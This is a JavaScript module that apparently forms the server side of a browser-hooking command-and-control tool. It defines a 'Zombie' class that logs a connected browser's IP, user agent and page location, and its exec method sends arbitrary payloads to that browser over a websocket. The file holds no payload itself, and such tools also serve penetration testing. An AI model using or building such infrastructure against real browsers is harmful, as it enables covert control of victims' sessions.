"use strict";

module.exports = (function() {

    var static_zombie_id_counter = 0;

    class Zombie
    {
        constructor(websocket)
        {
            this.id = static_zombie_id_counter++;
            this.ws = websocket;
            var self = this;
            this.ws.on("message", function(message){
                self.onMessage(message);
            });
            this.ws.on("close", function(){
                self.onClose();
            });
            this.ondestroy = function(){ };
            this.onready = function(){ };
        }

        on(evt, callback)
        {
            if(evt == "ready")
                this.onready = callback;
            else if(evt == "destroy")
                this.ondestroy = callback;
        }

        onClose()
        {
            this.ondestroy(this);
        }

        onMessage(message)
        {
            var data = message.utf8Data.split("\r\n");
            this.useragent = data[0];
            this.location = data[1];
            this.ip = this.ws.remoteAddress;
            this.onready(this);
        }

        getZombieId()
        {
            return this.id;
        }

        toJson()
        {
            return {
                id : this.id,
                ip : this.ip,
                useragent : this.useragent,
                location : this.location
            };
        }

        exec(payload)
        {
            this.ws.send(payload);
        }
    }

    return Zombie ;
})();